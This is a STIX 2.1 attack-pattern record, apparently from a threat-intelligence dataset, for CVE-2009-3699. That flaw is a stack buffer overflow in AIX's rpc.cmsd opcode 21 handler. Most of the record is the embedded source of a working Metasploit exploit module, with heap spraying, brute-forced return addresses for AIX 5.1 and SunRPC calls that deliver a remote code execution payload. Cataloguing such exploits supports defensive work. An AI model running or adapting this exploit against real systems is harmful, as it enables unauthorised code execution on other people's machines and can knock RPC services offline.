{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--896ffa6e-b0a7-4cb1-96b8-458ae39b3905",
    "created": "2024-08-14T16:56:44.921968Z",
    "modified": "2024-08-14T16:56:44.921972Z",
    "name": "AIX Calendar Manager Service Daemon (rpc.cmsd) Opcode 21 Buffer Overflow",
    "description": " This module exploits a buffer overflow vulnerability in opcode 21 handled by rpc.cmsd on AIX. By making a request with a long string passed to the first argument of the \"rtable_create\" RPC, a stack based buffer overflow occurs. This leads to arbitrary code execution.  NOTE: Unsuccessful attempts may cause inetd/portmapper to enter a state where further attempts are not possible. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/aix/rpc_cmsd_opcode21.rb",
            "external_id": "rpc_cmsd_opcode21.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3699"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20091013155835/http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=825"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20221204155746/http://aix.software.ibm.com/aix/efixes/security/cmsd_advisory.asc"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::SunRPC\n  include Msf::Exploit::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AIX Calendar Manager Service Daemon (rpc.cmsd) Opcode 21 Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow vulnerability in opcode 21 handled by\n        rpc.cmsd on AIX. By making a request with a long string passed to the first\n        argument of the \"rtable_create\" RPC, a stack based buffer overflow occurs. This\n        leads to arbitrary code execution.\n\n        NOTE: Unsuccessful attempts may cause inetd/portmapper to enter a state where\n        further attempts are not possible.\n      },\n      'Author'         =>\n        [\n          'Rodrigo Rubira Branco (BSDaemon)',\n          'jduck',\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-3699' ],\n          [ 'OSVDB', '58726' ],\n          [ 'BID', '36615' ],\n          [ 'URL', 'https://web.archive.org/web/20091013155835/http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=825' ],\n          [ 'URL', 'https://web.archive.org/web/20221204155746/http://aix.software.ibm.com/aix/efixes/security/cmsd_advisory.asc' ]\n        ],\n      'Platform'       => [ 'aix' ],\n      'Payload'        =>\n        {\n          'Space' => 4104,\n          'BadChars' => \"\\x00\",\n          # The RPC function splits the string by 0x40, watch out!\n          # It's not a payload badchar since we're putting the payload elsewhere...\n          'DisableNops' => true\n        },\n      'Targets'        =>\n        [\n          [\n            'IBM AIX Version 5.1',\n            {\n              'Arch'     => 'ppc',\n              'Platform' => 'aix',\n              'AIX'      => '5.1',\n              'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0x2022dfc8 },\n                #worked on ibmoz - 'Start' => { 'Ret' => 0x2022e8c8 },\n                'Stop'  => { 'Ret' => 0x202302c8 },\n                'Step'  => 600\n              }\n            }\n          ],\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2009-10-07'))\n\n  end\n\n  def brute_exploit(brute_target)\n\n    if not @aixpayload\n      datastore['AIX'] = target['AIX']\n      @aixpayload = regenerate_payload.encoded\n    end\n\n    print_status(\"Trying to exploit rpc.cmsd with address 0x%x ...\" % brute_target['Ret'])\n\n    begin\n      sunrpc_create('udp', 100068, 4)\n\n      # spray the heap a bit (work around powerpc cache issues)\n      buf = make_nops(1024 - @aixpayload.length)\n      buf << @aixpayload\n      xdr = Rex::Encoder::XDR.encode(buf, buf)\n      10.times {\n        sunrpc_call(7, xdr, 2)\n      }\n\n      #print_status(\"ATTACH DEBUGGER NOW!\"); select(nil,nil,nil,5)\n\n      buf = rand_text_alphanumeric(payload_space)\n      buf << [brute_target['Ret']].pack('N')\n\n      xdr = Rex::Encoder::XDR.encode(buf, \"\")\n      sunrpc_authunix('localhost', 0, 0, [])\n      sunrpc_call(21, xdr, 2)\n\n      handler(sunrpc_callsock)\n      sunrpc_destroy\n\n    rescue Rex::Proto::SunRPC::RPCTimeout\n      vprint_error('RPCTimeout')\n    rescue Rex::Proto::SunRPC::RPCError => e\n      vprint_error(e.to_s)\n    rescue EOFError\n      vprint_error('EOFError')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-10-07",
    "x_mitre_platforms": [
        "aix'"
    ]
}